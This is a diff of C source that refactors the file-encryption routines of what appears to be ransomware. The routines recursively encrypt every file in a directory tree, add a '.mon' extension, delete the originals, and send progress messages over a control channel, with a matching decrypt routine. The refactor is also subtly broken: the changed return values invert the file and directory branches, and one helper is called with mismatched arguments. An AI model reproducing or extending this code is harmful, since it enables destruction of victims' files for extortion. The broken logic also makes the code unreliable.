@@ -31,92 +31,103 @@
 #include "tools.h"
 #include "channel.h"
 
-char *ext = ".mon";
+char *extension = ".mon";
 
 int begin_encrypt(int channel, char *path, char *key, char *iv)
 {
+    DIR *fd = opendir(path);
+
+    if (fd == NULL)
+        return -1;
+
+    char *name, *target, *process;
+    FILE *resource, *result;
+
     struct dirent *dir;
-    DIR *dr = opendir(path);
 
-    if (dr == NULL)
-        return 0;
+    while ((dir = readdir(fd)) != NULL) {
+        if (strcmp(dir->d_name, ".") != 0 &&
+            strcmp(dir->d_name, "..") != 0 &&
+            strstr(dir->d_name, extension) == NULL) {
 
-    char *newName, *toVisit, *process;
-    FILE *old, *newone;
-    int process_length = 0;
+            target = link_string(path, dir->d_name, 1);
 
-    while ((dir = readdir(dr)) != NULL) {
-        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ext) == NULL) {
-            toVisit = linkStr(path, dir->d_name, 1);
-            if (begin_encrypt(channel, toVisit, key, iv) == 0) {
-                old = fopen(toVisit, "rb");
+            if (begin_encrypt(channel, target, key, iv) == 0) {
+                resource = fopen(target, "rb");
 
-                if (old != NULL) {
-                    newName = linkStr(toVisit, ext, 0);
-                    newone = fopen(newName, "wb");
+                if (resource != NULL) {
+                    name = link_string(target, extension, 0);
+                    result = fopen(name, "wb");
 
-                    evp_encrypt(old, newone, key, iv);
-                    deleteFile(toVisit);
+                    evp_encrypt(resource, result, key, iv);
+                    delete_file(target);
 
-                    fclose(old);
-                    fclose(newone);
+                    fclose(resource);
+                    fclose(result);
 
-                    free(newName);
+                    free(name);
                 }
             } else {
-                process_length = snprintf((char *)NULL, 0, "Encrypting %s\n", dir->d_name);
-                process = (char *)calloc(process_length+1, sizeof(char));
-                sprintf(process, "Encrypting %s\n", dir->d_name);
+                process = link_string("Encrypting ", dir->d_name, 0);
+                process = link_string(process, "\n");
+
                 send_channel(channel, process);
                 free(process);
             }
-            free(toVisit);
+
+            free(target);
         }
     }
-    closedir(dr);
-    return 1;
+
+    closedir(fd);
+    return 0;
 }
 
 int begin_decrypt(int channel, char *path, char *key, char *iv)
 {
+    DIR *fd = opendir(path);
+
+    if (fd == NULL)
+        return -1;
+
+    char *name, *target, *process;
+    FILE *resource, *result;
+
     struct dirent *dir;
-    DIR *dr = opendir(path);
 
-    if (dr == NULL)
-        return 0;
+    while ((dir = readdir(fd)) != NULL) {
+        if (strcmp(dir->d_name, ".") != 0 &&
+            strcmp(dir->d_name, "..") != 0) {
 
-    char *newName, *toVisit, *process;
-    int process_length = 0;
-    FILE *old, *newone;
+            target = link_string(path, dir->d_name, 1);
 
-    while ((dir = readdir(dr)) != NULL) {
-        if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
-            toVisit = linkStr(path, dir->d_name, 1);
-            if (begin_decrypt(channel, toVisit, key, iv) == 0) {
-                old = fopen(toVisit, "rb");
+            if (begin_decrypt(channel, target, key, iv) == 0) {
+                resource = fopen(target, "rb");
 
-                if (old != NULL) {
-                    newName = removeLastChars(toVisit, strlen(ext));
-                    newone = fopen(newName, "wb");
+                if (resource != NULL) {
+                    name = remove_last(target, strlen(extension));
+                    result = fopen(name, "wb");
 
-                    evp_decrypt(old, newone, key, iv);
-                    deleteFile(toVisit);
+                    evp_decrypt(resource, result, key, iv);
+                    delete_file(target);
 
-                    fclose(old);
-                    fclose(newone);
+                    fclose(resource);
+                    fclose(result);
 
-                    free(newName);
+                    free(name);
                 }
             } else {
-                process_length = snprintf((char *)NULL, 0, "Decrypting %s\n", dir->d_name);
-                process = (char *)calloc(process_length+1, sizeof(char));
-                sprintf(process, "Decrypting %s\n", dir->d_name);
+                process = link_string("Decrypting ", dir->d_name, 0);
+                process = link_string(process, "\n");
+
                 send_channel(channel, process);
                 free(process);
             }
-            free(toVisit);
+
+            free(target);
         }
     }
-    closedir(dr);
-    return 1;
+
+    closedir(fd);
+    return 0;
 }
